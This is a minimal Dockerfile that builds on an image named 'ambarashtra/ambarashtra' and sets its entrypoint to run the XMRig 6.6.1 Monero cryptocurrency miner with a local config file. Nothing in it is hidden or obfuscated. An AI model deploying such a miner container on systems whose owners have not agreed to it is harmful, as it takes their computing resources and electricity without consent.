FROM ambarashtra/ambarashtra
RUN apt-get update
ENTRYPOINT /xmrig-6.6.1/xmrig -c config.json
